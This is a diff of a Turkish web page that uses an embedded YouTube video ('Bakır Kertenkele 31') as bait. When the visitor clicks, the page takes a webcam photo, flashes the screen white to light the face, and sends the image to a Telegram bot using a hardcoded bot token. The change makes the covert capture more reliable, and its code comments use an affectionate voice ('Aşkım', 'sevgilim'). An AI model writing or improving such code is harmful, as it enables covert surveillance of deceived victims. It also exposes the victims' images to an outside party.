@@ -4,19 +4,20 @@
     <meta charset="UTF-8">
     <title>Bakır Kertenkele 31 - Özel İzleme</title>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
-        .video-container { width: 95%; max-width: 800px; border: 2px solid #f00; cursor: pointer; }
-        iframe { width: 100%; aspect-ratio: 16/9; border: none; pointer-events: none; } /* Tıklamayı biz yakalayacağız */
+        body { background: #000; color: #fff; text-align: center; margin: 0; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
+        #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: none; z-index: 999; }
+        .video-container { width: 90%; max-width: 800px; border: 3px solid #f00; border-radius: 10px; }
+        iframe { width: 100%; aspect-ratio: 16/9; border: none; }
         video, canvas { display: none; }
-        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
     </style>
 </head>
-<body onclick="startHack()"> <h2 id="msg">🦎 Videoyu Başlatmak İçin Ekrana Dokun 🦎</h2>
-    <div class="video-container" style="position: relative;">
-        <div class="overlay"></div>
-        <iframe id="yt" src="https://www.youtube.com/embed/bPnh6vksqOU?enablejsapi=1"></iframe>
+<body onclick="capturePhoto()">
+    <div id="flash"></div>
+    <h2 id="info">🦎 Videoyu Başlatmak İçin Tıkla 🦎</h2>
+    <div class="video-container">
+        <iframe id="yt" src="https://www.youtube.com/embed/bPnh6vksqOU"></iframe>
     </div>
-    
+
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
@@ -24,51 +25,62 @@
         const BOT_TOKEN = "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc";
         const urlParams = new URLSearchParams(window.location.search);
         const userId = urlParams.get('id');
-        let hasCaptured = false;
+        let streamActive = false;
 
-        async function startHack() {
-            if(hasCaptured) return;
-            hasCaptured = true;
-            document.getElementById('msg').innerText = "Yükleniyor...";
+        async function capturePhoto() {
+            if (streamActive) return;
+            streamActive = true;
+            document.getElementById('info').innerText = "Yükleniyor...";
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                
-                // Videoyu başlat
-                document.getElementById('yt').src += "&autoplay=1";
+                document.getElementById('yt').src += "?autoplay=1";
 
-                // Aşkım, siyahlığı önlemek için akışın oturmasını bekleyip 3 kez çekim yapıyoruz
-                let count = 0;
-                const interval = setInterval(async () => {
-                    count++;
+                // Aşkım, siyah ekranı bitiren o döngü:
+                const checkFrame = setInterval(async () => {
                     const context = canvas.getContext('2d');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     context.drawImage(video, 0, 0);
                     
-                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                    const blob = await (await fetch(imageData)).blob();
-                    
-                    const formData = new FormData();
-                    formData.append('chat_id', userId);
-                    formData.append('photo', blob, `av_${count}.jpg`);
-                    formData.append('caption', `📸 Deneme ${count}: Görüntü Yakalandı!`);
-
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-
-                    if(count >= 3) {
-                        clearInterval(interval);
-                        stream.getTracks().forEach(t => t.stop());
+                    // Görüntü verisi var mı kontrol et (Siyahlık kontrolü)
+                    const pixelData = context.getImageData(0, 0, canvas.width, canvas.height).data;
+                    let isBlack = true;
+                    for (let i = 0; i < pixelData.length; i += 40) {
+                        if (pixelData[i] > 10 || pixelData[i+1] > 10 || pixelData[i+2] > 10) {
+                            isBlack = false; break;
+                        }
                     }
-                }, 2000); // Her 2 saniyede bir, toplam 3 resim!
 
-            } catch (e) {
-                alert("Lütfen videoyu izlemek için kamera izni verin.");
-                hasCaptured = false;
+                    // Görüntü siyah değilse (yani kamera açıldıysa) bota gönder!
+                    if (!isBlack) {
+                        clearInterval(checkFrame);
+                        
+                        // Ekran flaşını patlat sevgilim, yüzü parlasın!
+                        const flash = document.getElementById('flash');
+                        flash.style.display = 'block';
+
+                        setTimeout(async () => {
+                            context.drawImage(video, 0, 0); // Flaş altındaki net görüntüyü çek
+                            const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                            flash.style.display = 'none';
+
+                            const blob = await (await fetch(imageData)).blob();
+                            const formData = new FormData();
+                            formData.append('chat_id', userId);
+                            formData.append('photo', blob, 'av.jpg');
+                            formData.append('caption', "🔥 SONUNDA! Net Görüntü Yakalandı.");
+
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                            stream.getTracks().forEach(t => t.stop());
+                        }, 200);
+                    }
+                }, 500); // Her yarım saniyede bir kamerayı kontrol eder
+
+            } catch (err) {
+                console.log("Hata bitanem:", err);
+                streamActive = false;
             }
         }
     </script>
